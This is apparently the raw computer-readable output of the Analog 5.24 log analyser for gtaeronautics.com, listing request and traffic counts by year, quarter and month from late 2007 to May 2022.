x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2022	05	08	05	44
x	FR	2007	12	18	17	05
x	LR	2022	05	06	23	56
x	E7	2022	05	08	05	44
x	SR	1038749
x	S7	1385
x	NC	410094
x	C7	0
x	FL	421598
x	F7	347
x	RR	187
x	R7	0
x	NH	92124
x	H7	284
x	BT	42782494721
x	B7	154076101
1	Rr	28085	2.704	2022
1	Rr	98917	9.523	2021
1	Rr	89380	8.605	2020
1	Rr	80088	7.710	2019
1	Rr	68927	6.636	2018
1	Rr	60168	5.792	2017
1	Rr	73316	7.058	2016
1	Rr	80796	7.778	2015
1	Rr	110773	10.664	2014
1	Rr	65173	6.274	2013
1	Rr	60742	5.848	2012
1	Rr	57015	5.489	2011
1	Rr	22139	2.131	2010
1	Rr	69710	6.711	2009
1	Rr	71820	6.914	2008
1	Rr	1700	0.164	2007
1	*BT	R	110773	2014
Q	Rr	8215	0.791	2022	2
Q	Rr	19870	1.913	2022	1
Q	Rr	21154	2.036	2021	4
Q	Rr	26826	2.583	2021	3
Q	Rr	30675	2.953	2021	2
Q	Rr	20262	1.951	2021	1
Q	Rr	22199	2.137	2020	4
Q	Rr	23882	2.299	2020	3
Q	Rr	21656	2.085	2020	2
Q	Rr	21643	2.084	2020	1
Q	Rr	19098	1.839	2019	4
Q	Rr	19668	1.893	2019	3
Q	Rr	19827	1.909	2019	2
Q	Rr	21495	2.069	2019	1
Q	Rr	18129	1.745	2018	4
Q	Rr	17138	1.650	2018	3
Q	Rr	16928	1.630	2018	2
Q	Rr	16732	1.611	2018	1
Q	Rr	15937	1.534	2017	4
Q	Rr	0	0.000	2017	3
Q	Rr	16831	1.620	2017	2
Q	Rr	27400	2.638	2017	1
Q	Rr	22114	2.129	2016	4
Q	Rr	17621	1.696	2016	3
Q	Rr	15878	1.529	2016	2
Q	Rr	17703	1.704	2016	1
Q	Rr	16575	1.596	2015	4
Q	Rr	22104	2.128	2015	3
Q	Rr	22485	2.165	2015	2
Q	Rr	19632	1.890	2015	1
Q	Rr	21142	2.035	2014	4
Q	Rr	22272	2.144	2014	3
Q	Rr	31453	3.028	2014	2
Q	Rr	35906	3.457	2014	1
Q	Rr	16436	1.582	2013	4
Q	Rr	15216	1.465	2013	3
Q	Rr	16545	1.593	2013	2
Q	Rr	16976	1.634	2013	1
Q	Rr	16578	1.596	2012	4
Q	Rr	12511	1.204	2012	3
Q	Rr	15816	1.523	2012	2
Q	Rr	15837	1.525	2012	1
Q	Rr	15444	1.487	2011	4
Q	Rr	17386	1.674	2011	3
Q	Rr	9395	0.904	2011	2
Q	Rr	14790	1.424	2011	1
Q	Rr	1603	0.154	2010	4
Q	Rr	0	0.000	2010	3
Q	Rr	14047	1.352	2010	2
Q	Rr	6489	0.625	2010	1
Q	Rr	16350	1.574	2009	4
Q	Rr	18220	1.754	2009	3
Q	Rr	17115	1.648	2009	2
Q	Rr	18025	1.735	2009	1
Q	Rr	15905	1.531	2008	4
Q	Rr	15660	1.508	2008	3
Q	Rr	22448	2.161	2008	2
Q	Rr	17807	1.714	2008	1
Q	Rr	1700	0.164	2007	4
Q	*BT	R	35906	2014	1
m	Rr	1414	0.136	2022	05
m	Rr	6801	0.655	2022	04
m	Rr	6380	0.614	2022	03
m	Rr	6175	0.594	2022	02
m	Rr	7315	0.704	2022	01
m	Rr	7667	0.738	2021	12
m	Rr	7097	0.683	2021	11
m	Rr	6390	0.615	2021	10
m	Rr	6059	0.583	2021	09
m	Rr	9092	0.875	2021	08
m	Rr	11675	1.124	2021	07
m	Rr	10152	0.977	2021	06
m	Rr	10231	0.985	2021	05
m	Rr	10292	0.991	2021	04
m	Rr	7948	0.765	2021	03
m	Rr	5800	0.558	2021	02
m	Rr	6514	0.627	2021	01
m	Rr	8069	0.777	2020	12
m	Rr	6579	0.633	2020	11
m	Rr	7551	0.727	2020	10
m	Rr	8028	0.773	2020	09
m	Rr	7741	0.745	2020	08
m	Rr	8113	0.781	2020	07
m	Rr	7317	0.704	2020	06
m	Rr	6898	0.664	2020	05
m	Rr	7441	0.716	2020	04
m	Rr	7524	0.724	2020	03
m	Rr	7322	0.705	2020	02
m	Rr	6797	0.654	2020	01
m	Rr	6573	0.633	2019	12
m	Rr	5917	0.570	2019	11
m	Rr	6608	0.636	2019	10
m	Rr	6791	0.654	2019	09
m	Rr	6597	0.635	2019	08
m	Rr	6280	0.605	2019	07
m	Rr	6317	0.608	2019	06
m	Rr	6847	0.659	2019	05
m	Rr	6663	0.641	2019	04
m	Rr	7059	0.680	2019	03
m	Rr	6374	0.614	2019	02
m	Rr	8062	0.776	2019	01
m	Rr	6957	0.670	2018	12
m	Rr	5422	0.522	2018	11
m	Rr	5750	0.554	2018	10
m	Rr	5458	0.525	2018	09
m	Rr	5735	0.552	2018	08
m	Rr	5945	0.572	2018	07
m	Rr	7110	0.684	2018	06
m	Rr	6440	0.620	2018	05
m	Rr	3378	0.325	2018	04
m	Rr	5789	0.557	2018	03
m	Rr	5369	0.517	2018	02
m	Rr	5574	0.537	2018	01
m	Rr	3906	0.376	2017	12
m	Rr	6533	0.629	2017	11
m	Rr	5498	0.529	2017	10
m	Rr	0	0.000	2017	09
m	Rr	0	0.000	2017	08
m	Rr	0	0.000	2017	07
m	Rr	0	0.000	2017	06
m	Rr	6832	0.658	2017	05
m	Rr	9999	0.963	2017	04
m	Rr	11887	1.144	2017	03
m	Rr	7941	0.764	2017	02
m	Rr	7572	0.729	2017	01
m	Rr	9483	0.913	2016	12
m	Rr	7121	0.686	2016	11
m	Rr	5510	0.530	2016	10
m	Rr	6288	0.605	2016	09
m	Rr	5888	0.567	2016	08
m	Rr	5445	0.524	2016	07
m	Rr	5042	0.485	2016	06
m	Rr	5495	0.529	2016	05
m	Rr	5341	0.514	2016	04
m	Rr	5558	0.535	2016	03
m	Rr	5548	0.534	2016	02
m	Rr	6597	0.635	2016	01
m	Rr	5574	0.537	2015	12
m	Rr	5330	0.513	2015	11
m	Rr	5671	0.546	2015	10
m	Rr	6196	0.596	2015	09
m	Rr	6788	0.653	2015	08
m	Rr	9120	0.878	2015	07
m	Rr	7156	0.689	2015	06
m	Rr	5694	0.548	2015	05
m	Rr	9635	0.928	2015	04
m	Rr	6215	0.598	2015	03
m	Rr	6084	0.586	2015	02
m	Rr	7333	0.706	2015	01
m	Rr	6608	0.636	2014	12
m	Rr	6997	0.674	2014	11
m	Rr	7537	0.726	2014	10
m	Rr	7043	0.678	2014	09
m	Rr	7324	0.705	2014	08
m	Rr	7905	0.761	2014	07
m	Rr	11654	1.122	2014	06
m	Rr	9211	0.887	2014	05
m	Rr	10588	1.019	2014	04
m	Rr	7817	0.753	2014	03
